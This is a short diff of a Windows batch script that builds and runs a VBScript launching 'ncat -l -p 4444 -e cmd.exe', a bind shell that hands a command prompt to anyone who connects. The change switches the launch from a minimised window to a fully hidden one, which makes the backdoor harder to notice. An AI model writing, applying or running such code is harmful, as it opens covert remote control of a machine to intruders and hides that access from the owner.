@@ -37,7 +37,7 @@ if exist "C:\Program Files (x86)\Nmap\ncat.exe" (
 )
 
 echo Set WshShell = CreateObject("WScript.Shell") > run_ncat.vbs
-echo WshShell.Run "ncat -l -p 4444 -e cmd.exe", 7, False >> run_ncat.vbs
+echo WshShell.Run "ncat -l -p 4444 -e cmd.exe", 0, False >> run_ncat.vbs
 
 cscript //B run_ncat.vbs
 
